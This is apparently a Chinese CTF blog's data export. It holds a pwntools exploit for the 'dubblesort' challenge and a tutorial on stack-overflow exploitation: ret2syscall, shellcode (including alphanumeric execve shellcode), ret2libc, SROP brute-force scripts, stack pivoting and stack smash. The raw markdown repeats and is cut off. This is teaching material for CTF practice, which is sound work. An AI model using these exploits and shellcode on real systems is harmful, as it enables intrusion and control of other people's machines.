class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = gdb.debug(&#x27;./dubblesort&#x27;,&#x27;b main&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./dubblesort&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;chall.pwnable.tw&#x27;</span>,<span class=\"number\">10101</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#elf = ELF(&#x27;/home/nemo/Active/CTFtools/glibc-all-in-one/libs/2.23-0ubuntu5_i386/libc-2.23.so&#x27;)</span></span><br><span class=\"line\">ret_add = <span class=\"number\">0x177dc</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">putNum</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27; : &#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">name = cyclic(<span class=\"number\">27</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;name :&#x27;</span>)</span><br><span class=\"line\">p.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = u32(p.recv(<span class=\"number\">32</span>+<span class=\"number\">6</span>)[-<span class=\"number\">4</span>:])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;%x&#x27;</span> % libc_base)</span><br><span class=\"line\">libc_base = (((libc_base&gt;&gt;<span class=\"number\">12</span>)-<span class=\"number\">0x1Ae</span>)&lt;&lt;<span class=\"number\">12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;%x&#x27;</span> % libc_base)</span><br><span class=\"line\">system_add = libc_base + elf.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;sort :&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;36&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">24</span>):</span><br><span class=\"line\">    putNum(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;+&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    putNum(system_add)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    putNum(libc_base+elf.search(<span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span>).__next__())</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x6-New-skills\">0x6 New skills</h2>\n<p><strong>PWN</strong></p>\n<ol>\n<li>±号绕过canary</li>\n<li>泄露栈上的libc地址</li>\n<li>debug对于远程的分析</li>\n</ol>\n<p><strong>Script</strong></p>\n<ol>\n<li>python格式化输出</li>\n<li>pwntools.elf模块搜索字符串。<br>\npython3的next()改名了</li>\n</ol>\n"},{"title":"Multiple-attack-methods-of-Stack-Overflow","date":"2022-08-02T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n\n\n### 0x1.杂谈\n\n作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合我个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给我发邮件，进行补充。\n\n本文持续更新，为广大pwn选手入门提供完善帮助\n\n\n\n本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One\n\n\n\n怎么去看待栈溢出题呢?   \n\n尽管利用方法多样，但是，就我个人的看法而言，整个栈溢出实际上只分为三种:\n\n**ret2syscall,  ret2libc,  ret2shellcode**\n\n实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。\n\n一般而言，pwn题的目的都是`getshell`(当然，也有直接读取flag的，这个后面单独谈)，而`getshell` 无外乎就三种途径，`syscall`，`libc-system`，`shellcode`\n\n\n\n当拿到一个题目时，首先思考：\n\n是否有syscall---->ret2syscall\n\n有可读可写内存空间吗---->ret2shellcode\n\n给了libc文件或者有信息泄露函数(IO函数)---->ret2libc\n\n接下来，再分门别类谈:\n\n### 0x1.ret2syscall\n\n因为syscall属于相对简单的，暂且放在前面谈。\n\n| %rax | System call | %rdi                 | %rsi                     | %rdx                     | %r10 | %r8  | %r9  |\n| :--- | :---------- | :------------------- | :----------------------- | :----------------------- | :--- | :--- | :--- |\n| 59   | sys_execve  | const char *filename | const char *const argv[] | const char *const envp[] |      |      |      |\n\n一般而言，需要`syscall`的题目中，都是构造这个系统调用实现。\n\n而在一些题目中通过`seccomp`禁用了`execve`的调用，所以不能直接利用，那么就利用open, read,  write 直接读取flag文件，也是一种办法。\n\n而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。\n\n在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。\n\n或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。\n\n总的而言，就是选择能够获取到地址的地方写入/bin/sh。\n\n\n\n**例题:**\n\nciscn_s_3\n\n\n\n### 0x2.ret2shellcode\n\n#### 0x2.1.shellcode的书写\n\n一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含可打印字符等等。所以尽可能自己熟悉shellcode的书写。\n\n一个简单的shellcode例子:\n\n```c\n// execve(path = '/bin///sh', argv = ['sh'], envp = 0)\npush 0x68\nmov rax, 0x732f2f2f6e69622f\npush rax\nmov rdi, rsp\n// push argument array ['sh\\x00']\n// push b'sh\\x00' \npush 0x1010101 ^ 0x6873\nxor dword ptr [rsp], 0x1010101\nxor esi, esi /* 0 */\npush rsi /* null terminate */\npush 8\npop rsi\nadd rsi, rsp\npush rsi /* 'sh\\x00' */\nmov rsi, rsp\nxor edx, edx /* 0 */\n// call execve()\npush SYS_execve /* 0x3b */\npop rax\nsyscall\n```\n\n这里获取`/bin/sh`地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。\n\n不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即`jmp  rax`此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。\n\n同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，`mov`和`syscall`都会遭到限制， 可用指令如下:\n\n```c\n1.数据传送:\npush/pop eax…\npusha/popa\n\n2.算术运算:\ninc/dec eax…\nsub al, 立即数\nsub byte ptr [eax… + 立即数], al dl…\nsub byte ptr [eax… + 立即数], ah dh…\nsub dword ptr [eax… + 立即数], esi edi\nsub word ptr [eax… + 立即数], si di\nsub al dl…, byte ptr [eax… + 立即数]\nsub ah dh…, byte ptr [eax… + 立即数]\nsub esi edi, dword ptr [eax… + 立即数]\nsub si di, word ptr [eax… + 立即数]\n\n3.逻辑运算:\nand al, 立即数\nand dword ptr [eax… + 立即数], esi edi\nand word ptr [eax… + 立即数], si di\nand ah dh…, byte ptr [ecx edx… + 立即数]\nand esi edi, dword ptr [eax… + 立即数]\nand si di, word ptr [eax… + 立即数]\n\nxor al, 立即数\nxor byte ptr [eax… + 立即数], al dl…\nxor byte ptr [eax… + 立即数], ah dh…\nxor dword ptr [eax… + 立即数], esi edi\nxor word ptr [eax… + 立即数], si di\nxor al dl…, byte ptr [eax… + 立即数]\nxor ah dh…, byte ptr [eax… + 立即数]\nxor esi edi, dword ptr [eax… + 立即数]\nxor si di, word ptr [eax… + 立即数]\n\n4.比较指令:\ncmp al, 立即数\ncmp byte ptr [eax… + 立即数], al dl…\ncmp byte ptr [eax… + 立即数], ah dh…\ncmp dword ptr [eax… + 立即数], esi edi\ncmp word ptr [eax… + 立即数], si di\ncmp al dl…, byte ptr [eax… + 立即数]\ncmp ah dh…, byte ptr [eax… + 立即数]\ncmp esi edi, dword ptr [eax… + 立即数]\ncmp si di, word ptr [eax… + 立即数]\n\n5.转移指令:\npush 56h\npop eax\ncmp al, 43h\njnz lable\n\n<=> jmp lable\n\n6.交换al, ah\npush eax\nxor ah, byte ptr [esp] // ah ^= al\nxor byte ptr [esp], ah // al ^= ah\nxor ah, byte ptr [esp] // ah ^= al\npop eax\n\n7.清零:\npush 44h\npop eax\nsub al, 44h ; eax = 0\n\npush esi\npush esp\npop eax\nxor [eax], esi ; esi = 0\n```\n\n一般而言,  我们采用`xor`或者`sub`指令修改shellcode后面的值，构造`0f 05`， 实现syscall。\n\n一个例子(纯字母数字shellcode):\n\n```c\n// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129\n/* from call rax */\npush rax\npush rax\npop rcx\n\n/* XOR pop rsi, pop rdi, syscall */\npush 0x41413030\npop rax\nxor DWORD PTR [rcx+0x30], eax\n\n/* XOR /bin/sh */\npush 0x34303041\npop rax\nxor DWORD PTR [rcx+0x34], eax\npush 0x41303041\npop rax\nxor DWORD PTR [rcx+0x38], eax\n\n/* rdi = &'/bin/sh' */\npush rcx\npop rax\nxor al, 0x34\npush rax\n\n/* rdx = 0 */\npush 0x30\npop rax\nxor al, 0x30\npush rax\npop rdx\n\npush rax\n\n/* rax = 59 (SYS_execve) */\npush 0x41\npop rax\nxor al, 0x7a\n\n/* pop rsi, pop rdi*/\n/* syscall */ \n.byte 0x6e\n.byte 0x6f\n.byte 0x4e\n.byte 0x44\n\n/* /bin/sh */\n.byte 0x6e\n.byte 0x52\n.byte 0x59\n.byte 0x5a\n.byte 0x6e\n.byte 0x43\n.byte 0x5a\n.byte 0x41\n```\n\n\n\n#### 0x2.2.shellcode生成工具\n\n同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。\n\n#### 0x2.3.mprotect()\n\n进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。\n\n这个函数可以修改指定内存段的权限\n\n```\nmprotect:\nint mprotect(void *addr, size_t len, int prot);\naddr 内存起始地址\nlen  修改内存的长度\nprot 内存的权限，7为可读可写可执行\n```\n\n如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode\n\n\n\n### 0x3.ret2libc\n\n#### 0x3.1.leak_libc\n\n对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.\n\n目前而言，我遇到的栈题中leak_libc，有两种方法：\n\n1. partial_overwrite\n   有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。\n2. 通过puts，write等函数，打印`.got`，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本\n\n```python\n# ref:  https://github.com/lieanu/LibcSearcher\n\nfrom LibcSearcher import *\n\n#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型\nobj = LibcSearcher(\"fgets\", 0X7ff39014bd90)\n\nobj.dump(\"system\")        #system 偏移\nobj.dump(\"str_bin_sh\")    #/bin/sh 偏移\nobj.dump(\"__libc_start_main_ret\")    \n\n```\n\n\n\n\n\n#### 0x3.2.partial_overwrite\n\n##### (1)前置知识\n\n针对没有泄露的赛题，可以考虑partial_overwrite改写`got`表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。\n\n考虑对于一个`got`表中的64位地址:  0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖`got`为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall\n\n##### (2)爆破脚本写法\n\n一个爆破脚本模板:\n\n```python\nfrom pwn import *\nimport sys\n\nelf ='./ciscn_s_3'\nremote_add = 'node4.buuoj.cn'\nremote_port = 29554\n\nmain_add = 0x40051d\noff = 0x130\nsystem_add = 0x400517\nrtframe = 0x4004da\nret_add = 0x4004e9\n\ni = 0\n\nwhile i < 20:\n    try:\n        context.log_level = 'debug'\n        context.arch = 'amd64'\n        if sys.argv[1] == 'r':\n            p = remote(remote_add, remote_port, timeout = 1)\n        elif sys.argv[1] == 'd':\n            p = gdb.debug(elf)\n        else:\n            p = process(elf, timeout = 1)\n        payload1 = b'/bin/sh\\0' + cyclic(0x8)\n        payload1+= p64(main_add)\n\n        p.sendline(payload1)\n\n        stack_add = u64(p.recv(0x28)[-8::]) - off\n\n        frame = SigreturnFrame()\n        frame.rax = 0x3b\n        frame.rdi = stack_add\n        frame.rsi = 0\n        frame.rdx = 0\n        frame.rsp = stack_add\n        frame.rip = system_add\n\n        payload = b'/bin/sh\\0' + cyclic(0x8)\n        payload+= p64(rtframe)\n        payload+= p64(system_add)\n        payload+= bytes(frame)\n\n\n        #p.sendline('a')\n        #p.recvuntil('\\0')\n        p.sendline(payload)\n        p.recvuntil('/bin/sh')\n        p.sendline('cat flag')\n        print(p.recvline())\n        \n        p.close()\n    except BaseException as e:\n        p.close()\n\n    off+=0x8\n    i+=1\n\n```\n\n核心模板:\n\n```c\nwhile True:\n    try:\n\t\t// p = process()\n\t\t// pass\n        p.sendline('cat flag')\n        print(p.recvline())\n        p.close()\n    except BaseException as e:\n        p.close()\n    // pass\n\n```\n\n采用grep 获取输出包含flag的行就行\n\n\n\n#### 0x3.3.ret2dl_resolve()\n\n延迟绑定会使用_dl_resolve()函数\n\n- _dl_resolve中\n\n  _dl_resolve调用_dl_fixup, _dl_dixup流程：\n\n  1. 通过link_map 获得.dynsym、.dynstr、.rel.plt地址\n  2. 通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针\n  3. 通过&(ELF64_Rel)->r_info 和.dynsym取得对应Elf64_Sym指针\n  4. 检查r_info\n  5. 检查&(Elf64_Sym)->st_other\n  6. 通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数\n\n综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)\n\n|              | 修改 dynamic 节的内容 | 修改重定位表项的位置                                         | 伪造 linkmap                                         |\n| :----------- | :-------------------- | :----------------------------------------------------------- | :--------------------------------------------------- |\n| 主要前提要求 | 无                    | 无                                                           | 无信息泄漏时需要 libc                                |\n| 适用情况     | NO RELRO              | NO RELRO, Partial RELRO                                      | NO RELRO, Partial RELRO                              |\n| 注意点       |                       | 确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应 | 确保重定位位置可写；需要着重伪造重定位表项、符号表； |\n\n\n\n### 0x4.Tricks\n\n#### 0x4.1.stack pivoting\n\n栈迁移技巧， 主要针对可溢出字节较少的情况，通过`leave`此类指令控制rsp\n\n```assembly\n;leave 相当于:\nmov rsp,rbp\npop rbp\n;那么考虑将栈帧中rbp地址改为栈迁移目的地址\n;leave两次之后，就可以将栈转移到目的地址\n;同时要现在目的地址布置好fake_stack\n```\n\n\n\n可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数\n\n\n\n不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:\n\n- 在第一次read读入后将rbp改为要写入的位置\n- ret到read\n- 第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8\n- 这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置\n\n\n\n#### 0x4.2.栈对齐\n\n栈对齐是高版本Ubuntu的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。\n\n这个特性来源于新版本xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump\n\n可以:\n\n```bash\n$ gdb -c core\n```\n\n调试core文件\n\n如果终止指令类似于:\n\n```c\n ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0\n```\n\n说明是栈对齐的原因，小心调整栈帧就行\n\n\n\n#### 0x4.3.Stack smash\n\n对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。\n\n在开启cannary 防护的题目中，检测到栈溢出后，会调用 `__stack_chk_fail` 函数来打印 argv[0] 指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag\n\n\n\n#### 0x4.4.SROP\n\n##### (1)前置知识:\n\n在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。\n\n那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。\n\n同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。\n\n\n\nSROP简要流程:\n\n1. 构造fake_frame\n2. 控制当前rsp指向fake_frame底部\n3. sigreturn调用\n\n\n\nsigFrame结构如下:\n\n```c\n// x64\nstruct _fpstate\n{\n  /* FPU environment matching the 64-bit FXSAVE layout.  */\n  __uint16_t        cwd;\n  __uint16_t        swd;\n  __uint16_t        ftw;\n  __uint16_t        fop;\n  __uint64_t        rip;\n  __uint64_t        rdp;\n  __uint32_t        mxcsr;\n  __uint32_t        mxcr_mask;\n  struct _fpxreg    _st[8];\n  struct _xmmreg    _xmm[16];\n  __uint32_t        padding[24];\n};\n\nstruct sigcontext\n{\n  __uint64_t r8;\n  __uint64_t r9;\n  __uint64_t r10;\n  __uint64_t r11;\n  __uint64_t r12;\n  __uint64_t r13;\n  __uint64_t r14;\n  __uint64_t r15;\n  __uint64_t rdi;\n  __uint64_t rsi;\n  __uint64_t rbp;\n  __uint64_t rbx;\n  __uint64_t rdx;\n  __uint64_t rax;\n  __uint64_t rcx;\n  __uint64_t rsp;\n  __uint64_t rip;\n  __uint64_t eflags;\n  unsigned short cs;\n  unsigned short gs;\n  unsigned short fs;\n  unsigned short __pad0;\n  __uint64_t err;\n  __uint64_t trapno;\n  __uint64_t oldmask;\n  __uint64_t cr2;\n  __extension__ union\n    {\n      struct _fpstate * fpstate;\n      __uint64_t __fpstate_word;\n    };\n  __uint64_t __reserved1 [8];\n};\n```\n\n\n\n##### (2)pwntools.srop\n\npwntools集成了SROP的模块，可以帮助制作fake_frame:\n\n```python\n// 一个简单的例子\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_read\nsigframe.rdi = 0\nsigframe.rsi = stack_addr\nsigframe.rdx = 0x400\nsigframe.rsp = stack_addr\nsigframe.rip = syscall_ret\n```\n\n\n\n","source":"_posts/Multiple-attack-methods-of-Stack-Overflow.md","raw":"---\ntitle: Multiple-attack-methods-of-Stack-Overflow\ndate: 2022-8-3\ntags: \n- Pwn\n- CTF\n\ncategories:\n- CTF\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用\n---\n\n\n\n\n\n### 0x1.杂谈\n\n作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合我个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给我发邮件，进行补充。\n\n本文持续更新，为广大pwn选手入门提供完善帮助\n\n\n\n本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One\n\n\n\n怎么去看待栈溢出题呢?   \n\n尽管利用方法多样，但是，就我个人的看法而言，整个栈溢出实际上只分为三种:\n\n**ret2syscall,  ret2libc,  ret2shellcode**\n\n实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。\n\n一般而言，pwn题的目的都是`getshell`(当然，也有直接读取flag的，这个后面单独谈)，而`getshell` 无外乎就三种途径，`syscall`，`libc-system`，`shellcode`\n\n\n\n当拿到一个题目时，首先思考：\n\n是否有syscall---->ret2syscall\n\n有可读可写内存空间吗---->ret2shellcode\n\n给了libc文件或者有信息泄露函数(IO函数)---->ret2libc\n\n接下来，再分门别类谈:\n\n### 0x1.ret2syscall\n\n因为syscall属于相对简单的，暂且放在前面谈。\n\n| %rax | System call | %rdi                 | %rsi                     | %rdx                     | %r10 | %r8  | %r9  |\n| :--- | :---------- | :------------------- | :----------------------- | :----------------------- | :--- | :--- | :--- |\n| 59   | sys_execve  | const char *filename | const char *const argv[] | const char *const envp[] |      |      |      |\n\n一般而言，需要`syscall`的题目中，都是构造这个系统调用实现。\n\n而在一些题目中通过`seccomp`禁用了`execve`的调用，所以不能直接利用，那么就利用open, read,  write 直接读取flag文件，也是一种办法。\n\n而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。\n\n在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。\n\n或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。\n\n总的而言，就是选择能够获取到地址的地方写入/bin/sh。\n\n\n\n**例题:**\n\nciscn_s_3\n\n\n\n### 0x2.ret2shellcode\n\n#### 0x2.1.shellcode的书写\n\n一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含可打印字符等等。所以尽可能自己熟悉shellcode的书写。\n\n一个简单的shellcode例子:\n\n```c\n// execve(path = '/bin///sh', argv = ['sh'], envp = 0)\npush 0x68\nmov rax, 0x732f2f2f6e69622f\npush rax\nmov rdi, rsp\n// push argument array ['sh\\x00']\n// push b'sh\\x00' \npush 0x1010101 ^ 0x6873\nxor dword ptr [rsp], 0x1010101\nxor esi, esi /* 0 */\npush rsi /* null terminate */\npush 8\npop rsi\nadd rsi, rsp\npush rsi /* 'sh\\x00' */\nmov rsi, rsp\nxor edx, edx /* 0 */\n// call execve()\npush SYS_execve /* 0x3b */\npop rax\nsyscall\n```\n\n这里获取`/bin/sh`地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。\n\n不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即`jmp  rax`此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。\n\n同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，`mov`和`syscall`都会遭到限制， 可用指令如下:\n\n```c\n1.数据传送:\npush/pop eax…\npusha/popa\n\n2.算术运算:\ninc/dec eax…\nsub al, 立即数\nsub byte ptr [eax… + 立即数], al dl…\nsub byte ptr [eax… + 立即数], ah dh…\nsub dword ptr [eax… + 立即数], esi edi\nsub word ptr [eax… + 立即数], si di\nsub al dl…, byte ptr [eax… + 立即数]\nsub ah dh…, byte ptr [eax… + 立即数]\nsub esi edi, dword ptr [eax… + 立即数]\nsub si di, word ptr [eax… + 立即数]\n\n3.逻辑运算:\nand al, 立即数\nand dword ptr [eax… + 立即数], esi edi\nand word ptr [eax… + 立即数], si di\nand ah dh…, byte ptr [ecx edx… + 立即数]\nand esi edi, dword ptr [eax… + 立即数]\nand si di, word ptr [eax… + 立即数]\n\nxor al, 立即数\nxor byte ptr [eax… + 立即数], al dl…\nxor byte ptr [eax… + 立即数], ah dh…\nxor dword ptr [eax… + 立即数], esi edi\nxor word ptr [eax… + 立即数], si di\nxor al dl…, byte ptr [eax… + 立即数]\nxor ah dh…, byte ptr [eax… + 立即数]\nxor esi edi, dword ptr [eax… + 立即数]\nxor si di, word ptr [eax… + 立即数]\n\n4.比较指令:\ncmp al, 立即数\ncmp byte ptr [eax… + 立即数], al dl…\ncmp byte ptr [eax… + 立即数], ah dh…\ncmp dword ptr [eax… + 立即数], esi edi\ncmp word ptr [eax… + 立即数], si di\ncmp al dl…, byte ptr [eax… + 立即数]\ncmp ah dh…, byte ptr [eax… + 立即数]\ncmp esi edi, dword ptr [eax… + 立即数]\ncmp si di, word ptr [eax… + 立即数]\n\n5.转移指令:\npush 56h\npop eax\ncmp al, 43h\njnz lable\n\n<=> jmp lable\n\n6.交换al, ah\npush eax\nxor ah, byte ptr [esp] // ah ^= al\nxor byte ptr [esp], ah // al ^= ah\nxor ah, byte ptr [esp] // ah ^= al\npop eax\n\n7.清零:\npush 44h\npop eax\nsub al, 44h ; eax = 0\n\npush esi\npush esp\npop eax\nxor [eax], esi ; esi = 0\n```\n\n一般而言,  我们采用`xor`或者`sub`指令修改shellcode后面的值，构造`0f 05`， 实现syscall。\n\n一个例子(纯字母数字shellcode):\n\n```c\n// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129\n/* from call rax */\npush rax\npush rax\npop rcx\n\n/* XOR pop rsi, pop rdi, syscall */\npush 0x41413030\npop rax\nxor DWORD PTR [rcx+0x30], eax\n\n/* XOR /bin/sh */\npush 0x34303041\npop rax\nxor DWORD PTR [rcx+0x34], eax\npush 0x41303041\npop rax\nxor DWORD PTR [rcx+0x38], eax\n\n/* rdi = &'/bin/sh' */\npush rcx\npop rax\nxor al, 0x34\npush rax\n\n/* rdx = 0 */\npush 0x30\npop rax\nxor al, 0x30\npush rax\npop rdx\n\npush rax\n\n/* rax = 59 (SYS_execve) */\npush 0x41\npop rax\nxor al, 0x7a\n\n/* pop rsi, pop rdi*/\n/* syscall */ \n.byte 0x6e\n.byte 0x6f\n.byte 0x4e\n.byte 0x44\n\n/* /bin/sh */\n.byte 0x6e\n.byte 0x52\n.byte 0x59\n.byte 0x5a\n.byte 0x6e\n.byte 0x43\n.byte 0x5a\n.byte 0x41\n```\n\n\n\n#### 0x2.2.shellcode生成工具\n\n同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。\n\n#### 0x2.3.mprotect()\n\n进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。\n\n这个函数可以修改指定内存段的权限\n\n```\nmprotect:\nint mprotect(void *addr, size_t len, int prot);\naddr 内存起始地址\nlen  修改内存的长度\nprot 内存的权限，7为可读可写可执行\n```\n\n如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode\n\n\n\n### 0x3.ret2libc\n\n#### 0x3.1.leak_libc\n\n对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.\n\n目前而言，我遇到的栈题中leak_libc，有两种方法：\n\n1. partial_overwrite\n   有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。\n2. 通过puts，write等函数，打印`.got`，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本\n\n```python\n# ref:  https://github.com/lieanu/LibcSearcher\n\nfrom LibcSearcher import *\n\n#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型\nobj = LibcSearcher(\"fgets\", 0X7ff39014bd90)\n\nobj.dump(\"system\")        #system 偏移\nobj.dump(\"str_bin_sh\")    #/bin/sh 偏移\nobj.dump(\"__libc_start_main_ret\")    \n\n```\n\n\n\n\n\n#### 0x3.2.partial_overwrite\n\n##### (1)前置知识\n\n针对没有泄露的赛题，可以考虑partial_overwrite改写`got`表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。\n\n考虑对于一个`got`表中的64位地址:  0xXXXXXXXXXXXXX， 